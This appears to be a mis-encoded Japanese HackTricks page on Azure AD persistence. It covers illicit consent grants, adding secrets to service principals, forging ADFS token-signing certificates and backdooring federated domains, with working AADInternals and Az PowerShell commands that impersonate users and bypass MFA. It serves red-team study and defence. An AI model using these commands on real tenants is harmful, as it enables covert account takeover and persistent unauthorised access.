# Az - æ°¸ç¶šæ€§

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã®ã‚µãƒãƒ¼ãƒˆ</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ **ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **HackTricks**ã¨**HackTricks Cloud**ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦**ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰**ã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}

### ä¸æ­£ãªåŒæ„ä»˜ä¸

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒAzure ADã§ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ç™»éŒ²ã§ãã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ç®¡ç†è€…ã®åŒæ„ï¼ˆç®¡ç†è€…ã§ã‚ã‚Œã°æ‰¿èªã™ã‚‹ï¼‰ãŒå¿…è¦ãªé«˜ã„å½±éŸ¿æ¨©é™ã‚’å¿…è¦ã¨ã™ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ç™»éŒ²ã§ãã¾ã™ï¼ˆå¯¾è±¡ãƒ†ãƒŠãƒ³ãƒˆã®ã¿ï¼‰ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€**ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°æ”»æ’ƒ**ã‚’å®Ÿè¡Œã§ãã€æˆåŠŸã™ã‚Œã°éå¸¸ã«**æœ‰ç›Š**ã«ãªã‚Šã¾ã™ã€‚

ã•ã‚‰ã«ã€ãã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’è‡ªåˆ†ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã§å—ã‘å…¥ã‚Œã‚‹ã“ã¨ã‚‚ã§ãã€ã‚¢ã‚¯ã‚»ã‚¹ã‚’ç¶­æŒã™ã‚‹æ‰‹æ®µã¨ã—ã¦ä½¿ç”¨ã§ãã¾ã™ã€‚

### ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¨ã‚µãƒ¼ãƒ“ã‚¹ ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«

Application Administratorã€GAã€ã¾ãŸã¯microsoft.directory/applications/credentials/updateæ¨©é™ã‚’æŒã¤ã‚«ã‚¹ã‚¿ãƒ ãƒ­ãƒ¼ãƒ«ã§ã€æ—¢å­˜ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«è³‡æ ¼æƒ…å ±ï¼ˆã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã¾ãŸã¯è¨¼æ˜æ›¸ï¼‰ã‚’è¿½åŠ ã§ãã¾ã™ã€‚

**é«˜ã„æ¨©é™ã‚’æŒã¤ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å¯¾è±¡ã«ã™ã‚‹**ã‹ã€**é«˜ã„æ¨©é™ã‚’æŒã¤æ–°ã—ã„ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’è¿½åŠ **ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«è¿½åŠ ã™ã‚‹èˆˆå‘³æ·±ã„ãƒ­ãƒ¼ãƒ«ã¯**ç‰¹æ¨©èªè¨¼ç®¡ç†è€…ãƒ­ãƒ¼ãƒ«**ã§ã‚ã‚Šã€ã“ã‚Œã«ã‚ˆã‚Š**ã‚°ãƒ­ãƒ¼ãƒãƒ«ç®¡ç†è€…ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ãƒªã‚»ãƒƒãƒˆ**ã§ãã¾ã™ã€‚

ã“ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ã¾ãŸã€**MFAã‚’ãƒã‚¤ãƒ‘ã‚¹**ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* è¨¼æ˜æ›¸ãƒ™ãƒ¼ã‚¹ã®èªè¨¼
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ - ãƒˆãƒ¼ã‚¯ãƒ³ç½²åè¨¼æ˜æ›¸

**ã‚ªãƒ³ãƒ—ãƒ¬ãƒŸã‚¹AD**ã§**DAæ¨©é™**ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€éå¸¸ã«é•·ã„æœ‰åŠ¹æœŸé–“ã‚’æŒã¤**æ–°ã—ã„ãƒˆãƒ¼ã‚¯ãƒ³ç½²å**ãŠã‚ˆã³**ãƒˆãƒ¼ã‚¯ãƒ³å¾©å·è¨¼æ˜æ›¸**ã‚’ä½œæˆãŠã‚ˆã³ã‚¤ãƒ³ãƒãƒ¼ãƒˆã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ç§ãŸã¡ã¯ImuutableIDã‚’çŸ¥ã£ã¦ã„ã‚‹ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦**ãƒ­ã‚°ã‚¤ãƒ³**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’**ADFSã‚µãƒ¼ãƒãƒ¼ä¸Šã®DA**ã¨ã—ã¦å®Ÿè¡Œã—ã¦ã€æ–°ã—ã„è¨¼æ˜æ›¸ã‚’ä½œæˆã—ï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã¯ 'AADInternals'ï¼‰ã€ãã‚Œã‚‰ã‚’ADFSã«è¿½åŠ ã—ã€è‡ªå‹•ãƒ­ãƒ¼ãƒ«ã‚ªãƒ¼ãƒãƒ¼ã‚’ç„¡åŠ¹ã«ã—ã¦ã‚µãƒ¼ãƒ“ã‚¹ã‚’å†èµ·å‹•ã—ã¾ã™ï¼š
```powershell
New-AADIntADFSSelfSignedCertificates
```
ãã®å¾Œã€Azure ADã§è¨¼æ˜æ›¸æƒ…å ±ã‚’æ›´æ–°ã—ã¾ã™:
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ - ä¿¡é ¼ã•ã‚ŒãŸãƒ‰ãƒ¡ã‚¤ãƒ³

ãƒ†ãƒŠãƒ³ãƒˆã§GAæ¨©é™ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€**æ–°ã—ã„ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚’è¿½åŠ **ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã€ãã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã®èªè¨¼ã‚¿ã‚¤ãƒ—ã‚’ãƒ•ã‚§ãƒ‡ãƒ¬ãƒ¼ãƒ†ãƒƒãƒ‰ã«æ§‹æˆã—ã€ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚’**ç‰¹å®šã®è¨¼æ˜æ›¸**ï¼ˆä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã®any.stsï¼‰ã¨ç™ºè¡Œè€…ã‚’ä¿¡é ¼ã™ã‚‹ã‚ˆã†ã«æ§‹æˆã§ãã¾ã™ã€‚
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## å‚ç…§

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã®ã‚µãƒãƒ¼ãƒˆ</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}
